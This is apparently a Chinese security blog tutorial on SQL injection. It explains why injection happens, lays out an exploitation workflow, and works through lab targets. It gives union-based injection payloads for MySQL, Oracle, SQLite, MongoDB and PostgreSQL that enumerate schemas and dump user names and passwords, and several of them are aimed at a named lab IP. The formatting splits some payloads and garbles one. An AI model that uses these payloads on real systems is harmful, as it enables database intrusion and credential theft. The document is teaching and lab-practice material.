> **原文链接**: https://mp.weixin.qq.com/s?__biz=Mzk3NTIyOTA0OQ==&mid=2247485306&idx=1&sn=b33bf198f98f09dc9473ac863ec4ff4a

#  WEB-SQL注入&数据库类型&用户权限&架构分层&符号干扰&利用过程&发现思路  
原创 朝阳  Sec朝阳   2025-07-20 08:12  
  
# 知识点：  
  
1、Web攻防-SQL注入-产生原理&应用因素  
  
2、Web攻防-SQL注入-各类数据库类型利用  
# 数据库知识：  
  
1  
、数据库名，表名，列名，数据  
  
2  
、自带数据库，数据库用户及权限  
  
3  
、数据库敏感函数，默认端口及应用  
  
4  
、数据库查询方法（增加删除修改更新）  
  
mysql：root最高权限用户  
  
数据库用户：管理数据库的用户 权限  
  
结构：一个用户管理一个数据库，管理一个网站，权限细化，不会造成一个越权，就是你搞你的，我搞我的，互不干扰。  
  
information_schema www.aaa.com = 数据库用户 fast  
  
mysql                        www.bbb.com = 数据库用户 test  
  
sys                             www.ccc.com  = 数据库用户 sys  
  
代码逻辑：  
  
接受数据，对数据进行解密解码，带入到SQL执行中  
  
攻击者必须把这个数据库按照他的加密或编码带进去  
  
格式特征：  
  
get提交  
  
?id=1  
  
?id=xiaodi  
  
?id={name:'daliu',password:'123456'}  
  
或者xml格式  
  
![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT1TPgcIRoFXehPYmHNOophVicQKSSvWDdia1nrcjcnetDUIVY57G2iblqQ5iaKvibI0Pjz2lK1RKxqamKw/640?wx_fmt=png&from=appmsg "")  
  
数据库框架：  
  
库名 --> 表名 --> 列名（字段） -->数据  
  
![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT1TPgcIRoFXehPYmHNOophVle3Ys3X5dKwSRINiaxVomSoQp5AD4IFPZseuPhu0vO7wP3ibskPLc94g/640?wx_fmt=png&from=appmsg "")  
# SQL注入产生原理：  
  
代码中执行的  
SQL  
语句存在可控变量导致  
  
#影响SQL注入的主要因素：  
  
1  
、数据库类型（权限操作）  
  
2  
、数据操作方法（增删改查）  
  
3  
、参数数据类型（符号干扰）  
  
4  
、参数数据格式（加密编码等）  
  
5  
、提交数据方式（数据包部分）  
  
6  
、有无数据处理（无回显逻辑等）  
  
#常见SQL注入的利用过程：  
  
1  
、判断数据库类型  
  
2  
、判断参数类型及格式  
  
3  
、判断数据格式及提交  
  
4  
、判断数据回显及防护  
  
5  
、获取数据库名，表名，列名  
  
5  
、获取对应数据及尝试其他利用  
  
#黑盒/白盒如何发现SQL注入  
  
1  
、盲对所有参数进行测试  
  
2  
、整合功能点脑补进行测试  
  
白盒参考后期代码审计课程  
  
利用过程：  
  
获取数据库名  
->  
表名  
->  
列名  
->  
数据（一般是关键数据，如管理员）  
  
靶场：  
  
http://vulnweb.com/  
  
https:  
//mozhe.cn/Special/SQL_Injection  
  
Access：已经基本淘汰 意义不大  
  
Mssql  
  
http:  
//vulnweb.com/  
  
这里开一个靶场看一下什么情况，这里有个参数，尝试修改参数看看报错  
  
![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT1TPgcIRoFXehPYmHNOophViaLzWm2zPTRhniaxMwK3yhia041Qg1HosicAI5DkSJiaB0wZvrHvyewYN9A/640?wx_fmt=png&from=appmsg "")  
  
随便输入，这里报错了  
  
![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT1TPgcIRoFXehPYmHNOophVbDATGicFGUeWvkpDxlLwnp7ImFgX9icRO3jkic7PpUibuRdXXPcqGtgE8g/640?wx_fmt=png&from=appmsg "")  
  
这里order by5报错，order by 4成功  
  
![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT1TPgcIRoFXehPYmHNOophVAyrvicRXVwwnJm15cFQykY1gwCPKf9LqmxXgIcic8AY3o1yCgg31dciaA/640?wx_fmt=png&from=appmsg "")  
  
这里让他报个错，输入?id=1 and 1=2 union select 1,2,3,4，判断回显点  
  
![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT1TPgcIRoFXehPYmHNOophVYiccNB7ftoJ8qzKUXKkczSXPibx4xx5ZD2V6She30yPOjohtgibkREDvQ/640?wx_fmt=png&from=appmsg "")  
  
然后这里查一下数据库名  
  
![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT1TPgcIRoFXehPYmHNOophVlCqQc0vCx7NvLEdYbibpubO6ySLTK14WjnQFEenC9CZMre1n4HTz0jA/640?wx_fmt=png&from=appmsg "")  
  
这里判断是否有注入点  

```
布尔判断
id=1 and 1=1 --+
看报错
id=1 and 1=2 --+
这里判断回显点
id=-1 union select 1，2，3，4 --+    
```

  
记录一下数据库名： mozhe_Discuz_StormGroup    

```
 mozhe_Discuz_StormGroup  
```

  
表名：StormGroup_member,notice  
  
这里是联合查询然后选择从 mozhe_Discuz_StormGroup数据库中的information_schema.tables表中，用group_concat函数选取table_name，也就是表名  

```
union select 1,group_concat(table_name),3,4 from information_schema.tables where
table_schema='mozhe_Discuz_StormGroup'

```

  
![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT1TPgcIRoFXehPYmHNOophVic9QDvicgWlNHhTa8EFvf8lwZ9HeTDgdXu9ibhUwJibfNUujpEp53SNvicQ/640?wx_fmt=png&from=appmsg "")  
  
是这样的一个逻辑  
  
列名：**id,name,password,status**  
  
这里更改只需要改我们要查询的列名，就是表相关参数都该成列的  

```
union select 1,group_concat(column_name),3,4 from information_schema.columns where
table_name='StormGroup_member'

```

  
![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT1TPgcIRoFXehPYmHNOophVNtiaVAOmAJEB4LywfCwHuXT1ZptnVo9mUZ5aDzHibVicqfzZqziaOwcm3w/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT1TPgcIRoFXehPYmHNOophV5JfJia58ayegTLdtWj44GgDvVNRXIzGjmvIib4YaXKaUQBn45Wz22HMg/640?wx_fmt=png&from=appmsg "")  
  
数据：  
  
union select 1,name,password,4 from StormGroup_member  
  
![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT1TPgcIRoFXehPYmHNOophVqI0YKhD8pxIDqJ1T35PtvD1spLq1iaKE9VIPXPl3Deo6icHJ76L9nKNQ/640?wx_fmt=png&from=appmsg "")  
  
information_schema.tables 自带数据库记录mysql所有表名的表  
  
information_schema.columns 自带数据库，记录mysql所有列名的表  
  
Oracle  
  
https:  
//blog.csdn.net/A2893992091/article/details/141365829  
  
and  
1  
=  
2  
union  
select  
(  
select  
distinct  
 owner   
from  
 all_tables   
where  
 rownum  
=  
1  
),  
'2'  
from  
 dual  
  
and  
1  
=  
2  
union  
select  
(  
select  
 table_name   
from  
 user_tables   
where  
 rownum  
=  
1  
),  
'2'  
from  
 dual  
  
and  
1  
=  
2  
union  
select  
(  
select  
 table_name   
from  
 user_tables whe  
https://blog.csdn.net/qq_32393893/article/details/103083240  
  
1  
=  
2  
union  
select  
(  
select  
 column_name   
from  
 all_tab_columns   
where  
 rownum  
=  
1  
and  
 table_name  
=  
'sns_users'  
),  
'2'  
from  
 dual  
  
and  
1  
=  
2  
union  
select  
(  
select  
 column_name   
from  
 all_tab_columns   
where  
 rownum  
=  
1  
and  
 table_name  
=  
'sns_users'  
and  
 column_name   
not  
in  
(  
'USER_NAME'  
)),  
'2'  
from  
 dual  
  
and  
1  
=  
2  
union  
select  
 USER_NAME  
,  
USER_PWD   
from  
"sns_users"  
  
and  
1  
=  
2  
union  
select  
 USER_NAME  
,  
USER_PWD   
from  
"sns_users"  
where  
 user_name   
not  
in  
(  
'hu'  
)  
  
SQLite  
  
判断诸如点：  

```
http://124.70.71.251:41903/new_list.php?id=1 and 1=1
http://124.70.71.251:41903/new_list.php?id=1 and 1=2
```

  
判断字段数  

```
http://124.70.71.251:41903/new_list.php?id=1 order by N (N=1, 2, 3, 4, 5)
```

  
当 N = 5 时，页面显示错误，当前表的字段数为 4。  
  
判断回显位  

```
http://124.70.71.251:41903/new_list.php?id=1 and 1=2 union select 1,2,3,4
```

  
查版本  

```
http://124.70.71.251:41903/new_list.php?id=1 and 1=2 union select 1,sqlite_version(),3,4
```

  
查表名和列名  

```
http://124.70.71.251:41903/new_list.php?id=1 and 1=2 union select 1,group_concat(sql),3,4 from sqlite_master
```

  
查数据  

```
http://124.70.71.251:41903/new_list.php?id=1 and 1=2 union select 1,group_concat(name),group_concat(password),4 from WSTMart_reg
```

  
依旧经典报错  
  
![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT1TPgcIRoFXehPYmHNOophVuicPgQsuEKibVc7r50g1LZTPV1ABbgyCDBG5DlEeLD3Xx62UQib0Y8Ljw/640?wx_fmt=png&from=appmsg "")  
  
爆列名：  

```
union select 1,name,sql,4 from sqlite_master limit 0,1
```

  
![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT1TPgcIRoFXehPYmHNOophV51W00ujmMXlNgYLZLK7L8GDBYibwvCcZXDDEmibfRNUzTXSayS0ClyCw/640?wx_fmt=png&from=appmsg "")  
  
字段  
  
union select   
1  
,  
name  
,  
password  
,  
4   
from  
 WSTMart_reg  
  
![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT1TPgcIRoFXehPYmHNOophV0Rb01urrTfibdGB6iaWC3Z3pGDWIn7GhNuJ1X2yibliaqCYVOUE5ELgVJQ/640?wx_fmt=png&from=appmsg "")  
  
Mongodb  
  
![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT1TPgcIRoFXehPYmHNOophVJN4zMKEg75oqSONRp7UFvGFfKnV6NVBW3v4Rr2dJYO8nmOrXVUib1bg/640?wx_fmt=png&from=appmsg "")  
  
构造回显：  
  
'}); return ({title:1,content:'2  
  
爆库：  
  
'}); return ({title:tojson(db),content:'1  
  
爆表：  
  
1'}); return ({title:tojson(db.getCollectionNames()),content:'1  
  
爆字段：  
  
'}); return ({title:tojson(db.Authority_confidential.find()[0]),content:'1  
  
PostgreSQL  
  
and  
1  
=  
2  
union  
select  
'null'  
,  
null  
,  
null  
,  
null  
  
and  
1  
=  
2  
union  
select  
null  
,  
'null'  
,  
null  
,  
null  
  
and  
1  
=  
2  
union  
select  
null  
,  
null  
,  
string_agg  
(  
datname  
,  
','  
),  
null  
from  
 pg_database  
  
and  
1  
=  
2  
union  
select  
null  
,  
null  
,  
string_agg  
(  
tablename  
,  
','  
),  
null  
from  
 pg_tables   
where  
 schemaname  
=  
'public'  
  
and  
1  
=  
2  
union  
select  
null  
,  
null  
,  
string_agg  
(  
column_name  
,  
','  
),  
null  
from  
 information_schema  
.  
columns  
where  
 table_name  
=  
'reg_users'  
  
and  
1  
=  
2  
unionselect  
null  
,  
string_agg  
(  
name  
,  
','  
),  
string_agg  
(  
password  
,  
','  
),  
null  
from  
 reg_users  
  
  
